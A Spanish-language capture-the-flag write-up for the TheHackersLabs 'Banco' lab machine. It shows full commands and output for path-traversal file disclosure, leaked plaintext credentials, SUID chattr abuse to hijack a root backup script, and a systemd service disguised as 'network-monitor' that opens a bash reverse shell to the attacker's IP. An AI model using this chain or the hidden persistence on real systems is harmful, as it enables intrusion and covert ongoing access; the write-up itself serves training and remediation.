---
title: "TheHackersLabs: Banco"
date: 2026-08-09
draft: false
tags: ["ctf", "thehackerslabs", "lfi", "path-traversal", "privilege-escalation", "chattr", "persistencia"]
categories: ["writeups"]
summary: "Recorrido completo de la máquina Banco de TheHackersLabs: explotación de un LFI en un descargador de PDF, filtrado de credenciales desde una base de datos JSON, escalada de privilegios abusando de chattr con bit SUID y persistencia mediante un servicio systemd."
---

*Un recorrido completo de la máquina Banco, detallando la explotación de una vulnerabilidad de Inclusión Local de Archivos (LFI) en un descargador de PDF, la recopilación de credenciales desde una base de datos expuesta, la escalada de privilegios mediante el bit SUID sobre `chattr` y el secuestro de un script mutable, y el establecimiento de persistencia sobre el sistema comprometido.*

**Publicado el 9 de agosto de 2026 · Por Ne0t3k · 10 minutos de lectura**

La máquina Banco de TheHackersLabs plantea una cadena de ataque que arranca con un escaneo de superficie convencional y termina con control total del sistema. El punto de entrada es un formulario de descarga de informes en PDF vulnerable a Local File Inclusion (LFI) mediante path traversal, que permite filtrar tanto la configuración de la aplicación como una base de datos en JSON con credenciales de usuario. A partir de ahí, el acceso SSH conduce a una escalada de privilegios por una mala configuración de permisos SUID sobre `chattr`, que habilita el secuestro de un script de backup ejecutado periódicamente como root. El compromiso se cierra con el despliegue de un mecanismo de persistencia a nivel de sistema.

IP objetivo: `10.0.2.15`. IP atacante: `10.0.2.20`. Las flags se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Escaneo de puertos

El primer paso es un escaneo SYN exhaustivo sobre los 65.535 puertos TCP para mapear la superficie de ataque inicial:

<pre class="term-log">
<span class="cmd">$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -oA banco-allports 10.0.2.15</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 04:46 -0400
Initiating ARP Ping Scan at 04:46
Scanning 10.0.2.15 [1 port]
Completed ARP Ping Scan at 04:46, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:46
Scanning 10.0.2.15 [65535 ports]
<span class="hl">Discovered open port 80/tcp on 10.0.2.15</span>
<span class="hl">Discovered open port 22/tcp on 10.0.2.15</span>
Completed SYN Stealth Scan at 04:47, 18.68s elapsed (65535 total ports)
Nmap scan report for 10.0.2.15
Host is up, received arp-response (0.63s latency).
Scanned at 2026-08-09 04:46:48 EDT for 19s
Not shown: 62907 closed tcp ports (reset), 2626 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:08:09:0D (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
           Raw packets sent: 86183 (3.792MB) | Rcvd: 65644 (2.626MB)
</pre>

**Desglose de parámetros:**

- `-sS`: escaneo SYN (半-abierto), no completa el handshake TCP, más discreto que un `connect scan`.
- `-p-`: escanea el rango completo de puertos (1-65535), en lugar de solo los 1000 más comunes.
- `--open`: filtra y muestra únicamente los puertos en estado abierto.
- `--min-rate 5000`: fuerza un envío mínimo de 5000 paquetes por segundo para acelerar el escaneo sobre el total de puertos.
- `-vvv`: verbosidad máxima, útil para seguir el progreso en tiempo real.
- `-n`: desactiva la resolución DNS inversa, evitando retrasos innecesarios.
- `-oA banco-allports`: guarda la salida simultáneamente en los tres formatos de Nmap (`.nmap`, `.gnmap`, `.xml`).

Con los puertos localizados, una segunda pasada identifica servicio y versión exacta:

<pre class="term-log">
<span class="cmd">$ sudo nmap -sC -sV -p22,80 -oA banco-services 10.0.2.15</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 04:47 -0400
Nmap scan report for 10.0.2.15
Host is up (0.0038s latency).
PORT   STATE SERVICE VERSION
<span class="hl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)</span>
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
<span class="hl">80/tcp open  http    Apache httpd 2.4.66 ((Debian))</span>
|_http-title: Banco de España | Portal Corporativo
|_http-server-header: Apache/2.4.66 (Debian)
MAC Address: 08:00:27:08:09:0D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
</pre>

**Desglose de parámetros:**

- `-sC`: ejecuta el conjunto de scripts NSE por defecto (banners, detección de vulnerabilidades básicas, claves SSH, etc.).
- `-sV`: activa la detección de versión de servicio mediante fingerprinting de respuestas.
- `-p22,80`: restringe el escaneo a los dos puertos ya confirmados como abiertos, evitando repetir el barrido completo.

El escaneo revela dos puertos TCP abiertos:

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 sobre Debian, para acceso remoto seguro.
- **Puerto 80 (HTTP)**: Apache 2.4.66, alojando el portal "Banco de España | Portal Corporativo".

## Web — Fuerza bruta de directorios

Para mapear la estructura del servidor, se ejecuta un escaneo de directorios y archivos con extensiones habituales de backend:

<pre class="term-log">
<span class="cmd">$ feroxbuster --url http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js -t 50 -o ferox-banco.log -q</span>
404      GET        9l       32w      311c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       29w      314c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      730l     1845w    24605c http://10.0.2.15/index.html
<span class="hl">405      GET        1l       11w      102c http://10.0.2.15/descargar.php</span>
200      GET      730l     1845w    24605c http://10.0.2.15/
301      GET        9l       29w      351c http://10.0.2.15/javascript => http://10.0.2.15/javascript/
<span class="hl">200      GET        0l        0w        0c http://10.0.2.15/config.php</span>
</pre>

**Desglose de parámetros:**

- `--url`: objetivo del escaneo.
- `-w`: ruta de la wordlist utilizada para generar las peticiones.
- `-x php,html,js`: añade estas extensiones a cada palabra de la wordlist para probar archivos backend además de directorios.
- `-t 50`: número de hilos concurrentes, acelera el escaneo a costa de más ruido en el servidor.
- `-o`: guarda el resultado en fichero además de mostrarlo en pantalla.
- `-q`: modo silencioso, sin el banner ni la interfaz interactiva de feroxbuster.

El descubrimiento revela dos rutas relevantes:

- **`/descargar.php`**: devuelve HTTP 405, indicando que solo acepta un método distinto a GET.
- **`/config.php`**: devuelve HTTP 200 pero sin contenido, señal de que su lógica se ejecuta de forma condicional.

## Web — Análisis del formulario de descarga en PDF

Al navegar directamente a `descargar.php` con GET se recibe un error de método no permitido. Se descarga el código fuente de la portada para localizar el formulario:

<pre class="term-log">
<span class="cmd">$ curl -s http://10.0.2.15/ -o index_source.html</span>
<span class="cmd">$ grep -i -A 5 "form" index_source.html</span>
    transform: scale(0.98);
}
    .forgot-link {
        margin-top: 20px;
    }
--
    ×
    Recuperar contraseña
    Introduzca su usuario para restablecer el acceso:
--
    Credencial actual:
--
    Colaboramos activamente con el BCE, el FMI y el Banco de Pagos Internacionales (BPI) para
    garantizar una economía resiliente. Además, publicamos indicadores y memorias anuales que
    aseguran la transparencia y el acceso a la información para todos los ciudadanos.
    En el ámbito tecnológico, hemos impulsado la innovación en pagos digitales, ciberseguridad
    y modernización de infraestructuras críticas. Nuestro compromiso es construir un ecosistema
    financiero seguro, eficiente e inclusivo para las próximas décadas.
    Informe institucional
    Descargue nuestro informe "Sobre nosotros" (PDF) donde detallamos nuestra trayectoria,
    estructura organizativa y funciones clave. Acceda al documento oficial del Banco de España.
    Descargar Informe (PDF)
    Documento firmado digitalmente · Archivo seguro
--
    // No muestra mensaje de error, solo el formulario
    msgDiv.style.display = 'none';
    document.getElementById('currentPassSpan').textContent = currentPassword;
    document.getElementById('changePassDiv').style.display = 'block';
    document.getElementById('newPass').value = '';
    document.getElementById('confirmNewPass').value = '';
</pre>

El `grep -A 5` sobre la palabra "form" devuelve varias coincidencias ruidosas (estilos CSS de `.forgot-link`, el modal de recuperación de contraseña, variables JavaScript del cambio de credencial), ya que la página tiene más de un elemento relacionado con formularios. Entre ese ruido aparece el bloque relevante: el botón **"Descargar Informe (PDF)"**, que en el HTML completo envía una petición `POST` a `descargar.php` con un parámetro `archivo` fijado a `sobrenosotros.pdf`.

## Explotación — Inclusión Local de Archivos y path traversal

Enviando un nombre de archivo inexistente al parámetro `archivo`, la respuesta filtra un mensaje de depuración con la ruta absoluta del backend:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=noexiste.pdf'</span>
Informe no disponible
No se ha podido localizar el documento solicitado. Verifique el nombre del archivo.
<span class="hl">Debug (entorno controlado): Ruta buscada: /var/www/html/informes/noexiste.pdf</span>
</pre>

**Desglose de parámetros:**

- `-s`: modo silencioso, oculta la barra de progreso de curl para dejar limpia la salida de la respuesta.
- `-X POST`: fuerza el método POST, requerido porque la ruta devuelve 405 ante GET.
- `--data-urlencode 'archivo=...'`: envía el parámetro `archivo` codificado como formulario URL, gestionando automáticamente caracteres especiales como `../` sin romper la petición.

Confirmada la ruta base (`/var/www/html/informes/`), se ejecuta el recorrido de directorios hacia `/etc/passwd`:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../../../../etc/passwd'</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
<span class="hl">wvverez:x:1001:1001:wvverez,,,:/home/wvverez:/bin/bash</span>
</pre>

Se identifica el único usuario del sistema con shell interactiva y directorio propio fuera de las cuentas de servicio: `wvverez`. El parámetro también permite leer el código fuente de scripts subiendo un nivel de directorio, ya que `descargar.php` sirve el archivo en crudo (probablemente vía `readfile()` o `fopen()`) sin interpretarlo como PHP.

## Explotación — Acceso a la base de datos y credenciales

Leyendo `config.php` mediante el mismo vector se filtra su código fuente completo:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../config.php'</span>
&lt;?php

<span class="hl">define('DB_FILE', __DIR__ . '/dbsuperscretinfact.json');</span>

function db_read() {
    if (!file_exists(DB_FILE)) file_put_contents(DB_FILE, json_encode(['users' => []]));
    return json_decode(file_get_contents(DB_FILE), true);
}

function db_write($data) {
    file_put_contents(DB_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

function db_get($key) {
    $data = db_read();
    return $data[$key] ?? null;
}

function db_set($key, $value) {
    $data = db_read();
    $data[$key] = $value;
    db_write($data);
}
?&gt;
</pre>

La constante `DB_FILE` apunta a `dbsuperscretinfact.json` en el mismo directorio (`/var/www/html/`). Se descarga con el mismo path traversal:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../dbsuperscretinfact.json' -o db_leak.json</span>
<span class="cmd">$ cat db_leak.json | jq .</span>
{
  "users": [
    { "id": 1, "username": "admin", "password": "Admin@2024!Secure#Hash$9921", "role": "administrator", "email": "admin@thehackerslabs.com", "created_at": "2024-01-15 10:30:00" },
    { "id": 2, "username": "root", "password": "R00t#P@ssw0rd!Secure$9921#XYZ", "role": "superuser", "email": "root@thehackerslabs.com", "created_at": "2024-01-15 10:30:00" },
    <span class="hl">{ "id": 3, "username": "wvverez", "password": "dasjbdaDASJDASDA11E1DAJDQA", "role": "user", "email": "wvverez@thehackerslabs.com", "ssh_key": "/home/wvverez/.ssh/id_rsa", "created_at": "2024-02-20 14:22:10" }</span>,
    { "id": 4, "username": "debian", "password": "Deb!@n#2024!Secure$Hash#9921", "role": "sudoer", "email": "debian@thehackerslabs.com", "created_at": "2024-03-05 09:15:33" },
    { "id": 5, "username": "juan.perez", "password": "Jp2024#Secure!MyP@ssw0rd$123", "role": "developer", "email": "juan.perez@thehackerslabs.com", "created_at": "2024-04-10 16:45:22" },
    { "id": 6, "username": "maria.garcia", "password": "Mg2024!Super#Secure$Password!XYZ", "role": "manager", "email": "maria.garcia@thehackerslabs.com", "created_at": "2024-05-18 11:20:45" },
    { "id": 7, "username": "carlos.lopez", "password": "Cl2024#Complex!P@ss@2024#Secure", "role": "moderator", "email": "carlos.lopez@thehackerslabs.com", "created_at": "2024-06-22 08:55:12" },
    { "id": 8, "username": "laura.martinez", "password": "Lm2024!Ultra#Secure$Password!2024", "role": "user", "email": "laura.martinez@thehackerslabs.com", "created_at": "2024-07-30 13:40:30" },
    { "id": 9, "username": "pedro.sanchez", "password": "Ps2024#Mega!Secure$Hash#9921XYZ", "role": "viewer", "email": "pedro.sanchez@thehackerslabs.com", "created_at": "2024-08-14 17:15:28" },
    { "id": 10, "username": "ana.torres", "password": "At2024!Hyper#Secure$Pass@2024!", "role": "editor", "email": "ana.torres@thehackerslabs.com", "created_at": "2024-09-25 10:05:47" },
    { "id": 11, "username": "david.ruiz", "password": "Dr2024#Max!Secure$P@ssw0rd$999", "role": "user", "email": "david.ruiz@thehackerslabs.com", "created_at": "2024-10-01 09:30:15" },
    { "id": 12, "username": "elena.moreno", "password": "Em2024!Ultimate#Secure$Pass@2024", "role": "admin", "email": "elena.moreno@thehackerslabs.com", "created_at": "2024-11-11 14:45:22" }
  ],
  "config": {
    "site_name": "The Hackers Labs",
    "version": "3.2.1",
    "debug": true,
    "api_key": "sk_live_XXXXXXXXXXXXXXX",
    "jwt_secret": "8zB6fXXXXXXXXXXXXXXX"
  }
}
</pre>

De los doce registros filtrados, solo `wvverez` corresponde a un usuario real del sistema, verificado previamente contra `/etc/passwd`. El resto son cuentas de aplicación (`admin`, `root`, `debian`, `juan.perez`, etc.) sin correspondencia en el sistema operativo, por lo que no se probaron contra SSH. El bloque `config` expone además un `api_key` y un `jwt_secret` de la aplicación, sin uso directo en esta cadena de explotación pero relevantes como hallazgo adicional de exposición de secretos.

## Movimiento lateral — Acceso SSH

Con la credencial filtrada, se autentica por SSH como `wvverez`:

<pre class="term-log">
<span class="cmd">$ ssh wvverez@10.0.2.15</span>
The authenticity of host '10.0.2.15 (10.0.2.15)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.15' (ED25519) to the list of known hosts.
wvverez@10.0.2.15's password:
Linux TheHackersLabs-Banco 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jun 20 01:18:14 2026 from 192.168.91.191
wvverez@TheHackersLabs-Banco:~$ id && hostname
uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
TheHackersLabs-Banco
wvverez@TheHackersLabs-Banco:~$ cat user.txt
<span class="hl-green">THL{dadDADAD...}</span>
</pre>

El aviso de host desconocido (`known_hosts` sin entrada previa para esta IP) es normal en un laboratorio recién desplegado. Flag de usuario localizada en `user.txt`.

## Escalada de privilegios — Enumeración de binarios SUID

Con acceso al sistema, se auditan los binarios con bit SUID:

<pre class="term-log">
<span class="cmd">$ find / -perm /4000 -type f 2>/dev/null</span>
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
<span class="hl">/usr/bin/lsattr</span>
<span class="hl">/usr/bin/chattr</span>
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

<span class="cmd">$ getcap -r / 2>/dev/null</span>
(sin resultados)

<span class="cmd">$ sudo -l</span>
sudo: unable to resolve host TheHackersLabs-Banco: Nombre o servicio desconocido
[sudo] contraseña para wvverez:
Sorry, user wvverez may not run sudo on TheHackersLabs-Banco.
</pre>

**Desglose de parámetros:**

- `-perm /4000`: filtra archivos donde al menos el bit SUID (`4000` en octal) está activo, independientemente de los demás permisos.
- `-type f`: restringe la búsqueda a archivos regulares, excluyendo directorios y enlaces.
- `getcap -r /`: busca recursivamente binarios con Linux capabilities asignadas (vector alternativo de escalada); no se encontró ninguno.

`chattr` y `lsattr` con SUID configurado es una mala práctica de alto riesgo: permite a cualquier usuario sin privilegios añadir o retirar atributos especiales de archivos del sistema, incluida la inmutabilidad. Localizando archivos con ese atributo:

<pre class="term-log">
<span class="cmd">$ find / -type f -exec lsattr {} ; 2>/dev/null | grep '^....i'</span>
<span class="hl">----i---------e------- /usr/local/bin/backup.sh</span>

<span class="cmd">$ lsattr /usr/local/bin/backup.sh</span>
<span class="hl">----i---------e------- /usr/local/bin/backup.sh</span>
</pre>

La `i` en la cuarta posición de la máscara de atributos confirma la inmutabilidad del script.

## Escalada de privilegios — Secuestro del script de respaldo inmutable

`backup.sh` respalda periódicamente una base de datos con privilegios de root. Antes de tocarlo, se examina su lógica:

<pre class="term-log">
<span class="cmd">$ cat /usr/local/bin/backup.sh</span>
#!/bin/bash
# backup.sh - Script para respaldar db.json

BACKUP_DIR="/var/backups"
SOURCE_FILE="/var/www/html/db.json"
DEST_FILE="$BACKUP_DIR/db_backup_$(date +'%Y%m%d_%H%M%S').json"
LOG_FILE="/var/log/backup.log"

mkdir -p "$BACKUP_DIR"

cp "$SOURCE_FILE" "$DEST_FILE" 2>/dev/null

echo "$(date) - Backup creado: $DEST_FILE" >> "$LOG_FILE"
ls -t $BACKUP_DIR/db_backup_*.json 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null
</pre>

Antes de inyectar el payload se verificó el disparador del script: no aparece en `/etc/crontab`, `/etc/cron.d/`, `cron.hourly`/`cron.daily` ni en `systemctl list-timers --all`. El análisis de `/var/log/backup.log` confirmó ejecuciones cada minuto de forma continua (con algunas discontinuidades entre el 7 de junio y el 20 de junio de 2026, y de nuevo activo el 9 de agosto), por lo que el mecanismo exacto de invocación queda fuera de lo observable desde una cuenta sin privilegios; probablemente gestionado a nivel de infraestructura del laboratorio.

Al no poder editarse por su atributo inmutable, se retira aprovechando el SUID de `chattr`:

<pre class="term-log">
<span class="cmd">$ chattr -i /usr/local/bin/backup.sh</span>
</pre>

**Desglose de parámetros:**

- `chattr -i`: retira (`-`) el atributo inmutable (`i`) del archivo, habilitando de nuevo la escritura sobre él. Solo es posible porque `chattr` tiene el bit SUID activo, ejecutándose con privilegios efectivos de root sin necesidad de `sudo`.

Con el script escribible, se añade el payload de escalada:

<pre class="term-log">
<span class="cmd">$ echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh</span>
<span class="cmd">$ cat /usr/local/bin/backup.sh</span>
#!/bin/bash
# backup.sh - Script para respaldar db.json

BACKUP_DIR="/var/backups"
SOURCE_FILE="/var/www/html/db.json"
DEST_FILE="$BACKUP_DIR/db_backup_$(date +'%Y%m%d_%H%M%S').json"
LOG_FILE="/var/log/backup.log"

mkdir -p "$BACKUP_DIR"

cp "$SOURCE_FILE" "$DEST_FILE" 2>/dev/null

echo "$(date) - Backup creado: $DEST_FILE" >> "$LOG_FILE"
ls -t $BACKUP_DIR/db_backup_*.json 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null
<span class="hl">chmod +s /bin/bash</span>
</pre>

## Flags — Acceso a la shell root

Tras la siguiente ejecución del script, el bit SUID queda aplicado sobre `/bin/bash`:

<pre class="term-log">
<span class="cmd">$ sleep 65 && ls -l /bin/bash</span>
<span class="hl-green">-rwsr-sr-x 1 root root 1265648 sep  7  2025 /bin/bash</span>

<span class="cmd">$ bash -p</span>
bash-5.2# id && whoami
uid=1001(wvverez) gid=1001(wvverez) <span class="hl-green">euid=0(root) egid=0(root)</span> grupos=0(root),100(users),1001(wvverez)
root
bash-5.2# cat /root/root.txt
<span class="hl-green">THL{dadDADAD...}</span>
</pre>

`bash -p` conserva los identificadores de usuario efectivos (`euid`/`egid`) al arrancar, en lugar de descartarlos como haría una bash normal ante una discrepancia entre UID real y efectivo — imprescindible para aprovechar el bit SUID recién asignado. Control administrativo total confirmado y flag de root localizada en `/root/root.txt`.

## Persistencia — Servicio systemd con reverse shell

Con root confirmado, se despliega un servicio systemd camuflado con nombre neutro, que abre una reverse shell hacia la máquina atacante en cada arranque del sistema:

<pre class="term-log">
<span class="cmd">bash-5.2# nano /etc/systemd/system/network-monitor.service</span>
<span class="cmd">bash-5.2# cat /etc/systemd/system/network-monitor.service</span>
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
<span class="hl">ExecStart=/bin/bash -c 'bash -i >&amp; /dev/tcp/10.0.2.20/4444 0>&amp;1'</span>
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

bash-5.2# systemctl daemon-reload
bash-5.2# systemctl enable network-monitor.service
Created symlink /etc/systemd/system/multi-user.target.wants/network-monitor.service → /etc/systemd/system/network-monitor.service.
bash-5.2# systemctl start network-monitor.service
bash-5.2# systemctl is-enabled network-monitor.service
<span class="hl-green">enabled</span>
bash-5.2# systemctl status network-monitor.service
● network-monitor.service - Network Monitoring Service
     Loaded: loaded (/etc/systemd/system/network-monitor.service; enabled; preset: enabled)
     Active: active (running) since Sun 2026-08-09 13:31:36 CEST; 19s ago
   Main PID: 13322 (bash)
      Tasks: 2 (limit: 2315)
     Memory: 1008.0K
        CPU: 21ms
     CGroup: /system.slice/network-monitor.service
             ├─13322 /bin/bash -c "bash -i >&amp; /dev/tcp/10.0.2.20/4444 0>&amp;1"
             └─13323 bash -i

ago 09 13:31:36 TheHackersLabs-Banco systemd[1]: Started network-monitor.service - Network Monitoring S&gt;
</pre>

**Desglose de parámetros:**

- `ExecStart`: comando ejecutado al iniciar el servicio; aquí abre una bash interactiva y redirige su entrada/salida/error hacia una conexión TCP contra el atacante (`/dev/tcp/IP/PUERTO` es una funcionalidad propia de bash, no un dispositivo real).
- `Restart=always` / `RestartSec=10`: reinicia el servicio automáticamente si el proceso termina, esperando 10 segundos entre intentos — mantiene la persistencia activa ante caídas de conexión.
- `WantedBy=multi-user.target`: integra el servicio en el target estándar de arranque multiusuario, garantizando su ejecución en cada boot.
- `systemctl daemon-reload`: obliga a systemd a releer las unidades tras crear el archivo `.service`.
- `systemctl enable`: crea el symlink en `multi-user.target.wants/` que activa el arranque automático.
- `systemctl is-enabled`: confirma que el servicio arrancará en el siguiente reinicio sin necesidad de esperar a probarlo.

Verificación desde la máquina atacante:

<pre class="term-log">
<span class="cmd">$ nc -lvnp 4444</span>
listening on [any] 4444 ...
<span class="hl-green">connect to [10.0.2.20] from (UNKNOWN) [10.0.2.15] 54816</span>
bash: no se puede establecer el grupo de proceso de terminal (579): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@TheHackersLabs-Banco:/#
</pre>

**Desglose de parámetros:**

- `-l`: modo escucha (listener), espera conexiones entrantes en vez de iniciar una.
- `-v`: verbose, informa de la conexión recibida.
- `-n`: no resuelve DNS, evita retrasos al mostrar la IP de origen.
- `-p 4444`: puerto local en el que escucha.

Los avisos de "grupo de proceso de terminal" y "sin control de trabajos" son habituales en shells no interactivas obtenidas por reverse shell (no hay TTY asignado); no afectan a la funcionalidad de la sesión root obtenida.

## Conclusión

La cadena de compromiso combina tres fallos independientes: validación insuficiente de rutas en `descargar.php`, exposición de credenciales en texto claro dentro del webroot, y una configuración SUID peligrosa sobre `chattr` que permite manipular scripts privilegiados en ejecución periódica. Como medidas correctivas: saneamiento estricto del parámetro `archivo` mediante lista blanca, retirada del bit SUID de `chattr`/`lsattr` (sin justificación operativa razonable en la mayoría de sistemas), y almacenamiento de credenciales fuera del webroot con hashing adecuado.
